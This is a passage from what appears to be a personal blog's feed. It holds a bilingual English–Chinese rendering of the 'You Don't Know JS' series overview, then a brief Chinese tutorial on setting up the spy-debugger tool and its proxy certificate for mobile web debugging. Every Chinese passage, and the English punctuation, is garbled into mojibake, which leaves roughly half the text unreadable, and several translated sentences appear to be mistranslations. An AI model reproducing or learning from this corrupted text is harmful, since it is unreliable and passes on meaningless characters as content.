æ‰€è®¤ä¸ºå…³äºJSä¸­çš„ç±»å’Œç»§æ‰¿,æˆ‘å°†ä¼šæä¾›ç»™ä½ è¿™ä¸ªæœºä¼šå»æ€è€ƒå¹¶æ”¹å˜ï¼Œç„¶åä½ å¯ä»¥æŸ¥é˜…è¿™ä¸€ç³»åˆ—çš„this &amp; object prototypeçš„ç¬¬4-6ç« </p><h2 id="Types-amp-Grammar"><a href="#Types-amp-Grammar" class="headerlink" title="Types &amp; Grammar"></a>Types &amp; Grammar</h2><p>The third title in this series primarily focuses on tackling yet another highly controversial topic: type coercion. Perhaps no topic causes more frustration with JS developers than when you talk about the confusions surrounding implicit coercion.</p><p>åœ¨è¿™ä¸€ç³»åˆ—ä¸­çš„ç¬¬ä¸‰æ ‡é¢˜ä¸»è¦è®¨è®ºå¦ä¸€ä¸ªæ¯”è¾ƒæœ‰äº‰è®®çš„è¯é¢˜:å¼ºåˆ¶ç±»å‹è½¬æ¢ã€‚å¯èƒ½æ²¡æœ‰ä»€ä¹ˆè¯é¢˜èƒ½æ¯”ä½ è®¨è®ºæ··ä¹±çš„ç±»å‹è½¬æ¢èƒ½è®©JSå¼€å‘è€…æ›´æ²®ä¸§çš„è¯é¢˜äº†ã€‚</p><p>By far, the conventional wisdom is that implicit coercion is a â€œbad partâ€ of the language and should be avoided at all costs. In fact, some have gone so far as to call it a â€œflawâ€ in the design of the language. Indeed, there are tools whose entire job is to do nothing but scan your code and complain if youâ€™re doing anything even remotely like coercion.</p><p>åˆ°ç›®å‰ä¸ºæ­¢ï¼Œä¼ ç»Ÿçš„æ™ºæ…§æ˜¯æ—¢ç„¶å¼ºåˆ¶ç±»å‹è½¬æ¢æ˜¯è¿™é—¨åŒ»é™¢ç³Ÿç³•çš„éƒ¨åˆ†ï¼Œæˆ‘ä»¬åº”å½“ä¸è®¡ä¸€åˆ‡çš„æˆæœ¬å»é¿å…ä»–ã€‚äº‹å®ä¸Šï¼Œä¸€äº›äººå»ç§°ä¹‹ä¸ºè¯­è¨€åçš„ä¸€éƒ¨åˆ†ã€‚äº‹å®ä¸Šï¼Œå·²ç»æœ‰å¾ˆå¤šä¸“é—¨æ‰«æä»£ç çš„å·¥å…·ï¼Œå½“ä½ çš„ä»£ç ä¸­ä½¿ç”¨äº†å¼ºåˆ¶ç±»å‹è½¬æ¢æˆ–è€…ç±»ä¼¼å¼ºåˆ¶è½¬æ¢çš„äº‹æƒ…å°†ä¼šæŠ¥è­¦ã€‚</p><p>But is coercion really so confusing, so bad, so treacherous, that your code is doomed from the start if you use it?</p><p>ä½†æ˜¯å¼ºåˆ¶ç±»å‹çœŸçš„å¦‚æ­¤æ··ä¹±ã€å¦‚æ­¤ç³Ÿç³•ã€å¦‚æ­¤ä¸å¯é ï¼Œä»¥è‡´äºä½ åœ¨ä»£ç ä¸­ä½¿ç”¨å®ƒå°±å¯¼è‡´ä½ çš„ä»£ç èµ°å‘ç­äº¡äº†å—ï¼Ÿ</p><p>I say no. After having built up an understanding of how types and values really work in Chapters 1-3, Chapter 4 takes on this debate and fully explains how coercion works, in all its nooks and crevices. We see just what parts of coercion really are surprising and what parts actually make complete sense if given the time to learn.</p><p>ä¸æ˜¯çš„ï¼Œä¸æ˜¯è¿™æ ·çš„ã€‚åœ¨ç¬¬1-3ç« ä¸­è®²è§£äº†ç±»å‹å’Œå€¼çœŸå®æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œç¬¬4ç« å‚ä¸äº†è¿™ä¸ªè®¨è®ºï¼Œå¹¶ä»å…¨é¢çš„è§’åº¦åˆ†æå¼ºåˆ¶ç±»å‹æ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚å¦‚æœä½ èŠ±æ—¶é—´å»å­¦ä¹ å®ƒçš„è¯ä½ å›å¯¹å¼ºåˆ¶ç±»å‹è½¬æ¢æ„Ÿåˆ°æƒŠå¥‡å¹¶ä¸”æ˜¯ååˆ†å®Œæ•´çš„ã€‚</p><p>But Iâ€™m not merely suggesting that coercion is sensible and learnable, Iâ€™m asserting that coercion is an incredibly useful and totally underestimated tool that you should be using in your code. Iâ€™m saying that coercion, when used properly, not only works, but makes your code better. All the naysayers and doubters will surely scoff at such a position, but I believe itâ€™s one of the main keys to upping your JS game.</p><p>ä½†æ˜¯æˆ‘ä¸ä»…ä»…å»ºè®®å¼ºåˆ¶ç±»å‹è½¬æ¢æ˜¯æ˜æ™ºçš„å¹¶ä¸”å¯å­¦çš„ï¼Œæˆ‘å£°æ˜å¼ºåˆ¶ç±»å‹è½¬æ¢æ˜¯éå¸¸æœ‰ç”¨çš„ï¼Œä½ åº”è¯¥ä½¿ç”¨ä½ çš„ä»£ç è€Œä¸æ˜¯ä½¿ç”¨é‚£äº›æ£€æµ‹å·¥å…·ã€‚æˆ‘è¦è¯´å½“ä½ æ­£å¸¸ä½¿ç”¨å¼ºåˆ¶ç±»å‹è½¬æ¢ä¸ä»…ä»…å¯ä»¥å·¥ä½œè¿˜ä¼šä½¿ä½ çš„ä»£ç æ›´å¥½ã€‚æ‰€æœ‰çš„å¦å®šè€…å’Œæ€€ç–‘è€…æ¯«æ— ç–‘é—®å°†ä¼šå˜²ç¬‘è¿™ä¸ªç«‹åœºï¼Œä½†æ˜¯æˆ‘ç›¸ä¿¡å®ƒå°†ä¼šæ˜¯ä½ ç©å¥½JSçš„ä¸»é”®ä¹‹ä¸€ã€‚</p><p>Do you want to just keep following what the crowd says, or are you willing to set all the assumptions aside and look at coercion with a fresh perspective? The Types &amp; Grammar title of this series will coerce your thinking.</p><p>ä½ æ˜¯å¦è¿˜æ˜¯åšæŒç›¸ä¿¡å¤§å¤šæ•°äººæ‰€è¯´çš„ï¼Œæˆ–è€…æ˜¯è¯´ä½ å·²ç»å°†æ‰€æœ‰çš„çŒœæƒ³éƒ½æ”¾åˆ°ä¸€è¾¹ã€‚å¹¶ä¸”å¯¹å¼ºåˆ¶è½¬æ¢æœ‰äº†ä¸€ä¸ªæ–°çš„è§‚ç‚¹ï¼Ÿç±»å‹å’Œè¯­æ³•è¿™ä¸€ç« å°†ä¼šå¼ºåˆ¶è½¬æ¢ä½ æ€è€ƒã€‚</p><h2 id="Async-amp-Performance"><a href="#Async-amp-Performance" class="headerlink" title="Async &amp; Performance"></a>Async &amp; Performance</h2><p>The first three titles of this series focus on the core mechanics of the language, but the fourth title branches out slightly to cover patterns on top of the language mechanics for managing asynchronous programming. Asynchrony is not only critical to the performance of our applications, itâ€™s increasingly becoming the critical factor in writability and maintainability.</p><p>è¿™ä¸€ç³»åˆ—çš„ç¬¬ä¸‰ä¸ªæ ‡é¢˜æˆ‘ä»¬å°†ä¸»è¦å…³æ³¨è¿™é—¨è¯­è¨€çš„æ ¸å¿ƒæŠ€æœ¯ï¼Œä½†æ˜¯ç¬¬å››ä¸ªæ ‡é¢˜ç¨å¾®æ‰©å±•äº†ä¸€äº›ï¼Œä»¥æ¶µç›–ç”¨äºç®¡ç†å¼‚æ­¥ç¼–ç¨‹çš„è¯­è¨€æœºåˆ¶ä¹‹ä¸Šçš„æ¨¡å¼ã€‚ä¸€éƒ¨ä¸æ˜¯å”¯ä¸€è¯„åˆ¤æˆ‘ä»¬åº”ç”¨æ€§èƒ½çš„æ ‡ç –ï¼Œè¶Šæ¥è¶Šå¤šçš„è¯„åˆ¤å› ç´ æ˜¯æ ¹ç»å¯å†™æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚</p><p>The book starts first by clearing up a lot of terminology and concept confusion around things like â€œasync,â€ â€œparallel,â€ and â€œconcurrent,â€ and explains in depth how such things do and do not apply to JS.</p><p>è¿™æœ¬ä¹¦é¦–æ¬¡å¼€å§‹ç†æ¸…å¤§é‡çš„å±äºå’Œæ··ä¹±çš„æ¦‚å¿µç±»ä¼¼äº:å¼‚æ­¥ã€åŒæ­¥ã€å¹¶è¡Œï¼Œæ·±å…¥çš„è§£é‡Šè¿™äº›ä¸œè¥¿å¦‚ä½•ç”¨æˆ–è€…ä¸ç”¨å†JSä¸Šã€‚</p><p>Then we move into examining callbacks as the primary method of enabling asynchrony. But itâ€™s here that we quickly see that the callback alone is hopelessly insufficient for the modern demands of asynchronous programming. We identify two major deficiencies of callbacks-only coding: Inversion of Control (IoC) trust loss and lack of linear reason-ability.</p><p>ç„¶åæˆ‘ä»¬å°†æ€è€ƒä¸ºä»€ä¹ˆå›è°ƒä½œä¸ºä¸»è¦çš„æ–¹æ³•å®ç°å¼‚æ­¥ï¼Œä½†æ˜¯æˆ‘ä»¬å°†å¾ˆå¿«çš„çœ‹åˆ°å›è°ƒå¯¹äºå¼‚æ­¥ç¼–ç¨‹æ¥è¯´ï¼Œä»…ä»…ä¾é å›è°ƒæ˜¯ä¸å¤Ÿçš„ã€‚æˆ‘ä»¬ç¡®å®šäº†å›è°ƒä»£ç çš„ä¸¤ä¸ªä¸è¶³ã€‚æ§åˆ¶åè½¬(IoC)ä¿¡ä»»ç¼ºå¤±ï¼Œç¼ºä¹çº¿æ€§æ¨ç†èƒ½åŠ›ã€‚</p><p>To address these two major deficiencies, ES6 introduces two new mechanisms (and indeed, patterns): promises and generators.</p><p>ä¸ºäº†è§£å†³è¿™ä¸¤å¤§ä¸è¶³ï¼Œestä»‹ç»äº†ä¸¤ç§æŠ€æœ¯:promiseå’Œgenerators</p><p>Promises are a time-independent wrapper around a â€œfuture value,â€ which lets you reason about and compose them regardless of if the value is ready or not yet. Moreover, they effectively solve the IoC trust issues by routing callbacks through a trustable and composable promise mechanism.</p><p>promiseæ˜¯ä¸€ä¸ªå…³äºæœªæ¥å€¼çš„æ—¶é—´åŒ…è£…ï¼Œå®ƒå…è®¸ä½ ç»„æˆå¹¶æ¨ç†ä»–ä»¬ï¼Œæ— è®ºå€¼æ˜¯å¦å·²å‡†å¤‡å¥½ã€‚å¹¶ä¸”ï¼Œä»–ä»¬æœ‰æ•ˆçš„è§£å†³äº†æ§åˆ¶åè½¬ä¿¡ä»»é—®é¢˜ï¼Œé€šè¿‡å¯ä¿¡ä»»å’Œå¯ç»„åˆçš„promiseæœºåˆ¶è·¯ç”±å›è°ƒã€‚</p><p>Generators introduce a new mode of execution for JS functions, whereby the generator can be paused at yield points and be resumed asynchronously later. The pause-and-resume capability enables synchronous, sequential looking code in the generator to be processed asynchronously behind the scenes. By doing so, we address the non-linear, non-local-jump confusions of callbacks and thereby make our asynchronous code sync-looking so as to be more reason-able.</p><p>Generatorsä»‹ç»äº†ä¸€ä¸ªè¡Œçš„JSå‡½æ•°æ‰§è¡Œæ¨¡å¼ï¼Œå‡­å€Ÿgeneratorèƒ½é€šè¿‡yieldå…³é”®è¯æš‚åœå¹¶ä¸”ç¨åé‡æ–°å¼€å§‹å¼‚æ­¥ã€‚è¿™ç§æš‚åœå’Œé‡æ–°å¼€å§‹çš„å¼‚æ­¥èƒ½åŠ›ï¼Œåœ¨åå°å¼‚æ­¥å¤„ç†ç”Ÿæˆå™¨ä¸­çš„é¡ºåºæŸ¥æ‰¾ä»£ç ã€‚é€šè¿‡è¿™æ ·åšï¼Œæˆ‘ä»¬èƒ½å¤„ç†å›è°ƒå‡½æ•°çš„éçº¿æ€§ã€å›è°ƒä¹‹é—´çš„æ··ä¹±è·³è½¬ã€‚å› æ­¤èƒ½å¤Ÿä½¿æˆ‘ä»¬çš„å¼‚æ­¥ä»£ç è¶Šæ¥è¶ŠåŒæ­¥å’Œå¯é ã€‚</p><p>But itâ€™s the combination of promises and generators that â€œyieldsâ€ our most effective asynchronous coding pattern to date in JavaScript. In fact, much of the future sophistication of asynchrony coming in ES7 and later will certainly be built on this foundation. To be serious about programming effectively in an async world, youâ€™re going to need to get really comfortable with combining promises and generators.</p><p>ä½†æ˜¯yieldsç»“åˆäº†promiseå’Œgeneratorsæ˜¯æˆ‘ä»¬è‡³ä»Šä¸ºæ­¢åœ¨JSä¸­æœ€æœ‰æ•ˆçš„å¼‚æ­¥ä»£ç é£æ ¼ã€‚äº‹å®ä¸Šï¼Œä¸è¿œå°†æ¥ï¼Œåœ¨es7æˆ–è€…åé¢ç‰ˆæœ¬ä¸­å°†ä¼šè¿æ¥æ›´å¤æ‚çš„å¼‚æ­¥çš„ï¼Œå¯ä»¥ç¡®å®šçš„æ˜¯éƒ½å°†å»ºç«‹åœ¨è¿™ä¸ªåŸºç¡€ä¹‹ä¸Šã€‚è®¤çœŸå¯¹å¾…å¼‚æ­¥ä¸–ç•Œä¸­çš„æœ‰æ•ˆç¼–ç¨‹,ä½ éœ€è¦å»é€‚åº”promiseå’Œgeneratorçš„æ··åˆã€‚</p><p>If promises and generators are about expressing patterns that let our programs run more concurrently and thus get more processing accomplished in a shorter period, JS has many other facets of performance optimization worth exploring.</p><p>å¦‚æœpromiseå’Œgeneratoræ˜¯å…³äºè¡¨è¾¾æ¨¡å¼ï¼Œä½¿æˆ‘ä»¬çš„ç¨‹åºèƒ½å¤Ÿæ›´å¹¶å‘åœ°è¿è¡Œï¼Œä»è€Œåœ¨æ›´çŸ­çš„æ—¶é—´å†…å®Œæˆæ›´å¤šçš„å¤„ç†ï¼ŒJSæœ‰å¾ˆå¤šå…¶ä»–æ€§èƒ½ä¼˜åŒ–çš„å†…å®¹å€¼å¾—æ¢ç´¢ã€‚</p><p>Chapter 5 delves into topics like program parallelism with Web Workers and data parallelism with SIMD, as well as low-level optimization techniques like ASM.js. Chapter 6 takes a look at performance optimization from the perspective of proper benchmarking techniques, including what kinds of performance to worry about and what to ignore.<br>ç¬¬äº”ç« å°†è¿›å…¥å¹¶è¡Œä¸»é¢˜çš„webå·¥ä½œå’Œå¹¶è¡Œæ•°æ®çš„SIMDï¼Œä¸ä½çº§åˆ«çš„å‹ç¼©æŠ€æœ¯æƒ³ASM.jsã€‚ç¬¬å…­ç« ä»åŸºå‡†æŠ€æœ¯æ¥çœ‹ä¸€çœ‹æ€§èƒ½ä¼˜åŒ–ï¼ŒåŒ…æ‹¬å“ªäº›æ€§èƒ½æ˜¯éœ€è¦æ‹…å¿§çš„å“ªäº›æ˜¯å¯ä»¥å¿½ç•¥çš„ã€‚</p><p>Writing JavaScript effectively means writing code that can break the constraint barriers of being run dynamically in a wide range of browsers and other environments. It requires a lot of intricate and detailed planning and effort on our parts to take a program from â€œit worksâ€ to â€œit works well.â€</p><p>ç¼–å†™æœ‰æ•ˆçš„javascriptæ„å‘³ç€ç¼–å†™èƒ½å¤Ÿæ‰“ç ´èƒ½åŠ¨æ€è¿è¡Œåœ¨å¤§å¤šæ•°æµè§ˆå™¨å’Œå…¶ä»–ç¯å¢ƒçš„éšœç¢ã€‚å®ƒèƒ½å·¥ä½œåˆ°å®ƒèƒ½å·¥ä½œçš„å¾ˆå¥½ï¼Œéœ€è¦å¾ˆå¤šå¤æ‚è¯¦ç»†çš„è®¡åˆ’å’ŒåŠªåŠ›ã€‚</p><p>The Async &amp; Performance title is designed to give you all the tools and skills you need to write reasonable and performant JavaScript code.</p><p>è¿™å¼‚æ­¥å’Œæ€§èƒ½æ ‡é¢˜æ˜¯ä¸ºäº†ç»™ä½ éœ€è¦ç¼–å†™åˆç†å’Œé«˜æ€§èƒ½çš„jsä»£ç æ‰€éœ€è¦çš„å·¥å…·å’ŒæŠ€èƒ½ã€‚</p><p>ES6 &amp; Beyond<br>No matter how much you feel youâ€™ve mastered JavaScript to this point, the truth is that JavaScript is never going to stop evolving, and moreover, the rate of evolution is increasing rapidly. This fact is almost a metaphor for the spirit of this series, to embrace that weâ€™ll never fully know every part of JS, because as soon as you master it all, thereâ€™s going to be new stuff coming down the line that youâ€™ll need to learn.</p><p>æ— è®ºä½ æ„Ÿè§‰ä½ å¤šç²¾é€šjavascriptï¼ŒçœŸç†æ˜¯javascriptç»ä¸åœæ­¢æ›´æ–°ï¼Œè€Œä¸”ï¼Œæ›´æ–°çš„é€Ÿåº¦å˜å¾—è¶Šæ¥è¶Šå¿«ã€‚äº‹å®ä»è¿™ä¸€ç³»åˆ—å»æ‹¥æŠ±æˆ‘ä»¬è¸Šè·ƒéƒ½ä¸å¯èƒ½çŸ¥é“Jsçš„æ‰€æœ‰éƒ¨åˆ†ï¼Œå› ä¸ºä½ ä¸å¯èƒ½ç²¾é€šå®ƒæ‰€æœ‰çš„éƒ¨åˆ†ï¼Œå¾ˆå¿«å°±å¯èƒ½æœ‰æ–°çš„åŠŸèƒ½ä½ éœ€è¦å»å­¦ä¹ çš„ã€‚</p><p>This title is dedicated to both the short- and mid-term visions of where the language is headed, not just the known stuff like ES6 but the likely stuff beyond.</p><p>è¿™ä¸ªæ ‡é¢˜æ˜¯ä¸“æ³¨äºè¿™é—¨è¯­è¨€çŸ­æœŸå’Œä¸­æœŸæˆ¿å±•æ–¹å‘çš„ï¼Œä¸ä»…ä»…çŸ¥é“es6è¿™æ ·çš„ä¸œè¥¿è¿˜æœ‰å…¶ä»–å¯èƒ½å¾—ä¸œè¥¿</p><p>While all the titles of this series embrace the state of JavaScript at the time of this writing, which is mid-way through ES6 adoption, the primary focus in the series has been more on ES5. Now, we want to turn our attention to ES6, ES7, and â€¦</p><p>è€Œæœ¬ç³»åˆ—çš„æ‰€æœ‰æ ‡é¢˜åŒ…å«äº†è¿™ä¸€æ—¶æœŸåä½œçš„javascriptçŠ¶æ€ï¼Œå“ªäº›ä¸­ç­‰æ–¹æ³•é€šè¿‡äº†es6çš„é‡‡ç”¨ï¼Œç€ä¸€äº›åˆ—ä¸»è¦å…³æ³¨æ›´å¤šçš„åœ¨äºes5ï¼Œç°åœ¨æˆ‘ä»¬å°†è¦è½¬å˜æˆ‘ä»¬çš„æ³¨æ„åˆ°es6ã€es7æ›´å¤š</p><p>Since ES6 is nearly complete at the time of this writing, ES6 &amp; Beyond starts by dividing up the concrete stuff from the ES6 landscape into several key categories, including new syntax, new data structures (collections), and new processing capabilities and APIs. We cover each of these new ES6 features, in varying levels of detail, including reviewing details that are touched on in other books of this series.</p><p>å› ä¸ºåœ¨å†™ä½œä¹‹æ—¶es6å·²ç»æ¥è¿‘å®Œæˆï¼Œes6å’Œbeyondå¼€å§‹åˆ†å‰²es6åŠŸèƒ½ä¸ºå‡ ä¸ªå…³é”®åˆ†ç±»ï¼ŒåŒ…æ‹¬æ–°çš„é¢„å‘ï¼Œæ–°çš„æ•°æ®ç»“æœå’Œæ–°çš„å¤„ç†èƒ½åŠ›å’Œapiã€‚æˆ‘ä»¬è¦†ç›–äº†æ‰€æœ‰æ–°çš„es6åŠŸèƒ½ï¼Œåœ¨ä¸å˜çš„è¯¦ç»†ç­‰çº§ï¼ŒåŒ…æ‹¬åœ¨è¿™ä¸€ç³»åˆ—çš„å…¶ä»–ä¹¦ä¸Šè§¦æ‘¸åˆ°çš„ç»†èŠ‚ã€‚</p><p>Some exciting ES6 things to look forward to reading about: destructuring, default parameter values, symbols, concise methods, computed properties, arrow functions, block scoping, promises, generators, iterators, modules, proxies, weakmaps, and much, much more! Phew, ES6 packs quite a punch!</p><p>ä¸€äº›ä»¤äººå…´å¥‹ç›¼æœ›å»é˜…è¯»çš„es6äº‹ç‰©:è§£æ„ã€å‚æ•°é»˜è®¤å€¼ã€ç¬¦å·ã€ç®€å•æ–¹æ³•ã€è®¡ç®—å±æ€§ã€ç®­å¤´å‡½æ•°ã€å—ä½œç”¨åŸŸã€æ‰¿è¯ºã€ç”Ÿæˆå™¨ã€éå†ã€æ¨¡å—åŒ–ã€ä»£ç†ã€‚es6å¾ˆæœ‰å†²å‡»åŠ›</p><p>The first part of the book is a roadmap for all the stuff you need to learn to get ready for the new and improved JavaScript youâ€™ll be writing and exploring over the next couple of years.</p><p>æœ¬ä¹¦çš„ç¬¬ä¸€éƒ¨åˆ†æ˜¯ä¸€å¼ è·¯çº¿å›¾ï¼Œåˆ—å‡ºäº†ä½ æ‰€æœ‰éœ€è¦å­¦ä¹ çš„å†…å®¹ã€‚ä¸ºäº†åœ¨æœªæ¥å‡ å¹´ç¼–å†™å’Œç ”ç©¶æ–°çš„javascriptå†…å®¹å’Œæ”¹è¿›javascriptåšå¥½å‡†å¤‡ã€‚</p><p>The latter part of the book turns attention to briefly glance at things that we can likely expect to see in the near future of JavaScript. The most important realization here is that post-ES6, JS is likely going to evolve feature by feature rather than version by version, which means we can expect to see these near-future things coming much sooner than you might imagine.</p><p>æœ¬ä¹¦çš„æœ€åä¸€éƒ¨åˆ†è½¬å˜æ³¨æ„åŠ›åˆ°ï¼Œç®€å•æµè§ˆä¸€ä¸‹åœ¨ä¸è¿œå°†æ¥æˆ‘ä»¬èƒ½åœ¨javascriptä¸­çœ‹åˆ°çš„å†…å®¹ã€‚es6çš„å‘å¸ƒæ˜¯æœ€é‡è¦çš„å…³ç³»ï¼ŒJSçœ‹èµ·æ¥å°±åƒè¿›å…¥äº†ä¸€ä¸ªåŠŸèƒ½æ¥ä¸€ä¸ªåŠŸèƒ½ä¸€ä¸ªç‰ˆæœ¬æ¥ä¸€ä¸ªç‰ˆæœ¬ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬èƒ½æ¢ç´¢çš„ä¸è¿œå°†æ¥çš„äº‹æƒ…å¾ˆå¿«å°±ä¼šåˆ°æ¥ï¼Œæ¯”ä½ æƒ³è±¡çš„è¿˜è¦å¿«ã€‚</p><p>The future for JavaScript is bright. Isnâ€™t it time we start learning it!?</p><p>Javascriptçš„æœªæ¥æ˜¯æ˜äº®çš„ã€‚ç°åœ¨ä¸æ˜¯æˆ‘ä»¬å¼€å§‹å­¦ä¹ çš„æ—¶å€™äº†å—ï¼Ÿ</p><p>Review<br>The YDKJS series is dedicated to the proposition that all JS developers can and should learn all of the parts of this great language. No personâ€™s opinion, no frameworkâ€™s assumptions, and no projectâ€™s deadline should be the excuse for why you never learn and deeply understand JavaScript.</p><p>ä½ ä¸æ‡‚jsç³»åˆ—æ˜¯ä¸“æ³¨äºæ‰€æœ‰JSå¼€å‘è€…èƒ½å¹¶ä¸”åº”è¯¥å­¦ä¹ è¿™ä¸€ä¼Ÿå¤§è¯­è¨€çš„æ‰€æœ‰éƒ¨åˆ†çš„è¿™ä¸€å‘½é¢˜ã€‚æ²¡æœ‰ä¸ªäººä¹‹è§ï¼Œæ²¡æœ‰æ¡†æ¶å‡è®¾ï¼Œæ²¡æœ‰é¡¹ç›®æœŸé™èƒ½æˆä¸ºä½ ä¸ºä»€ä¹ˆå­¦ä¹ å¹¶ä¸”æ·±å…¥ç†è§£javascriptçš„åŸå› ã€‚</p><p>We take each important area of focus in the language and dedicate a short but very dense book to fully explore all the parts of it that you perhaps thought you knew but probably didnâ€™t fully.</p><p>æˆ‘ä»¬è°ˆè®ºè¿™é—¨è¯­è¨€åº”è¯¥å…³æ³¨çš„é‡ç‚¹åœ°æ–¹å¹¶ä¸”è‡´åŠ›äºç®€çŸ­ï¼Œä½†æ˜¯éå¸¸æµ“å¯†çš„ä¹¦å»å……åˆ†æ¢ç´¢æœ‰å¯èƒ½è®¤ä¸ºä½ çŸ¥é“å€’æ˜¯å¯èƒ½ä¸å…¨é¢çš„æ‰€æœ‰éƒ¨åˆ†ã€‚</p><p>â€œYou Donâ€™t Know JSâ€ isnâ€™t a criticism or an insult. Itâ€™s a realization that all of us, myself included, must come to terms with. Learning JavaScript isnâ€™t an end goal but a process. We donâ€™t know JavaScript, yet. But we will!</p><p>ä½ ä¸æ‡‚JSä¸æ˜¯æ‰¹è¯„å’Œä¾®è¾±ã€‚è¿™æ˜¯æˆ‘ä»¬æ‰€æœ‰äººäººè®¤çŸ¥çš„ï¼Œæˆ‘è‡ªå·±ä¹Ÿä¸ä¾‹å¤–ã€‚å­¦ä¹ javascriptä¸æ˜¯ä¸€ä¸ªæœ€ç»ˆç›®æ ‡ä½†æ˜¯æ˜¯ä¸€ä¸ªè¿‡ç¨‹ã€‚æˆ‘ä»¬ä¸æ‡‚javascriptï¼Œä½†æ˜¯æˆ‘ä»¬å°†ä¼šæ‡‚å¾—ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Chapter-3-Into-YDKJS&quot;&gt;&lt;a href=&quot;#Chapter-3-Into-YDKJS&quot; class=&quot;headerlink&quot; title=&quot;Chapter 3: Into YDKJS&quot;&gt;&lt;/a&gt;Chapter 3: Into YDKJS&lt;/h2&gt;&lt;p&gt;What is this series all about? Put simply, itâ€™s about taking seriously the task of learning all parts of JavaScript, not just some subset of the language that someone called â€œthe good parts,â€ and not just whatever minimal amount you need to get your job done at work.&lt;/p&gt;
&lt;p&gt;è¿™ä¸€ç³»åˆ—ä¹¦ä¸»è¦ç”¨äºè°ˆè®ºä»€ä¹ˆå‘¢ï¼Ÿç®€å•æ¥è¯´ï¼Œè¿™ä¸€ç³»åˆ—ä¹¦ä¸»è¦ç”¨æˆ·è®²è¿°å¦‚ä½•å­¦å¥½javascriptï¼Œè€Œä¸æ˜¯å­¦ä¹ ä¸€äº›äººç§°ä¹‹ä¸ºjavascriptä¸­å¥½çš„éƒ¨åˆ†ï¼Œä¹Ÿä¸ä»…ä»…èƒ½è®©ä½ æå®šå·¥ä½œçš„é‚£ä¸€å°éƒ¨åˆ†å†…å®¹ã€‚&lt;/p&gt;
&lt;div&gt;
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="book" scheme="http://zhoushaw.github.io/tags/book/"/>
    
  </entry>
  
  <entry>
    <title>spy-debugger</title>
    <link href="http://zhoushaw.github.io/2019/02/04/learning/font-end/debugger/spy-debugger/"/>
    <id>http://zhoushaw.github.io/2019/02/04/learning/font-end/debugger/spy-debugger/</id>
    <published>2019-02-04T00:52:35.000Z</published>
    <updated>2019-04-14T13:54:11.947Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç§»åŠ¨ç«¯webè°ƒè¯•ååˆ†éº»çƒ¦ï¼Œchromeè°ƒè¯•å·¥å…·ä¸æ”¯æŒiosï¼Œåœ¨iosç«¯å‡ºç°å…¼å®¹é—®é¢˜å°†ååˆ†éš¾æ˜“è°ƒè¯•ï¼Œæ™®é€šçš„logæ–¹å¼è°ƒè¯•æ—¶é—´å¤§é‡æŸè€—ï¼Œæœ‰æ²¡æœ‰ä¸€ä¸ªæ–¹ä¾¿æ˜“ç”¨çš„æ–¹å¼å‘¢ï¼Œspy-debuggerå¯ä»¥å¾ˆå¥½çš„è§£å†³çš„è¿™ä¸ªé—®é¢˜ï¼Œè·¨å¤šç«¯webviewè°ƒè¯•ä¹Ÿéå¸¸æ–¹ä¾¿å¿«æ·</p><div><a id="more"></a></div><h2 id="èµ·æ­¥"><a href="#èµ·æ­¥" class="headerlink" title="èµ·æ­¥"></a>èµ·æ­¥</h2><blockquote><p>å®‰è£…</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install spy-debugger -g</span><br></pre></td></tr></table></figure><blockquote><p>å¯åŠ¨</p></blockquote><p><code>spy-debugger</code></p><blockquote><p>ç¯å¢ƒé…ç½®</p></blockquote><p>æ‰‹æœºä¸pcä¿æŒåŒä¸€ä¸ªå±€åŸŸç½‘<br>iosä»£ç†è®¾ç½®:è®¾ç½® - æ— çº¿å±€åŸŸç½‘ - é€‰ä¸­ç½‘ç»œ - HTTPä»£ç†æ‰‹åŠ¨</p><p>ä»£ç†é…ç½®ä¿¡æ¯ä¸ºï¼Œå¯åŠ¨å‘½ä»¤è¡Œçª—å£ä¸­ä¼šæš´éœ²ipåœ°å€å’Œç«¯å£å·</p><blockquote><p>å®‰è£…æ­£å¼</p></blockquote><p>æµè§ˆå™¨è®¿é—®:<a href="http://s.xxx(çœŸå®åŸŸåå°±æ˜¯è¿™ä¸ªä¸ç”¨æ€€ç–‘)" target="_blank" rel="noopener">http://s.xxx(çœŸå®åŸŸåå°±æ˜¯è¿™ä¸ªä¸ç”¨æ€€ç–‘)</a><br>æŒ‰ç…§æ“ä½œæ­¥éª¤å®Œæˆå®‰è£…ï¼Œ</p><blockquote><p>ä¿¡ä»»è¯ä¹¦</p></blockquote><p>1.è®¾ç½® - é€šç”¨ - è¯ä¹¦ä¿¡ä»»è®¾ç½® - è®¾ç½®node-mitmproxyä¸ºä¿¡ä»»è¯ä¹¦<br>2.è®¾ç½® - é€šç”¨ - å…³äºæ‰‹æœº - è¯ä¹¦ä¿¡ä»»è®¾ç½® - è®¾ç½®node-mitmproxyä¸ºä¿¡ä»»è¯ä¹¦</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;ç§»åŠ¨ç«¯webè°ƒè¯•ååˆ†éº»çƒ¦ï¼Œchromeè°ƒè¯•å·¥å…·ä¸æ”¯æŒiosï¼Œåœ¨iosç«¯å‡ºç°å…¼å®¹é—®é¢˜å°†ååˆ†éš¾æ˜“è°ƒè¯•ï¼Œæ™®é€šçš„logæ–¹å¼è°ƒè¯•æ—¶é—´å¤§é‡æŸè€—ï¼Œæœ‰æ²¡æœ‰ä¸€ä¸ªæ–¹ä¾¿æ˜“ç”¨çš„æ–¹å¼å‘¢ï¼Œspy-debuggerå¯ä»¥å¾ˆå¥½çš„è§£å†³çš„è¿™ä¸ªé—®é¢˜ï¼Œè·¨å¤šç«¯webviewè°ƒè¯•ä¹Ÿéå¸¸æ–¹ä¾¿å¿«æ·&lt;/p&gt;
&lt;div&gt;
    
    </summary>
    
      <category term="debugger" scheme="http://zhoushaw.github.io/categories/debugger/"/>
    
    
